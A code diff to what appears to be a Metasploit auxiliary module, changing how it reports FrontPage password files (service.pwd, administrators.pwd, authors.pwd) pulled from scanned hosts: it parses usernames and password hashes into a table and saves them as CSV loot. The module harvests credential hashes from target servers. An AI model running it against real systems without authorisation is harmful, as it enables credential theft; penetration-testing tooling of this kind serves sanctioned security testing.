@@ -64,8 +64,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     files = ['service.pwd', 'administrators.pwd', 'authors.pwd']
+    creds = []
 
     files.each do |filename|
+      source = filename.chomp('.pwd').capitalize
       contents = get_pass_file(filename)
 
       next if contents.nil?
@@ -73,12 +75,40 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{ip} - #{filename}")
 
       contents.each_line do |line|
-        print_good(line.chomp)
+        next if line.chomp == '# -FrontPage-'
+        user = line.chomp.split(':')[0]
+        pass = line.chomp.split(':')[1]
+
+        creds << [source, user, pass]
       end
-
-      print_line
-
-      store_loot("frontpage.pwd.file", "text/plain", ip, contents, filename)
     end
+
+    cred_table = Rex::Text::Table.new(                                      
+      'Header'  => 'FrontPage Credentials',
+      'Indent'  => 1,
+      'Columns' => ['Source', 'Username', 'Password Hash']
+    )
+
+    creds.each do |c|
+      cred_table << c
+    end
+
+    print_line
+    print_line("#{cred_table}")
+
+    loot_name     = 'frontpage.creds'
+    loot_type     = 'text/csv'
+    loot_filename = 'frontpage_creds.csv'
+    loot_desc     = 'FrontPage Credentials'
+
+    p = store_loot(
+      loot_name,
+      loot_type,
+      rhost,
+      cred_table.to_csv,
+      loot_filename,
+      loot_desc)
+
+    print_status "Credentials saved in: #{p}"
   end
 end
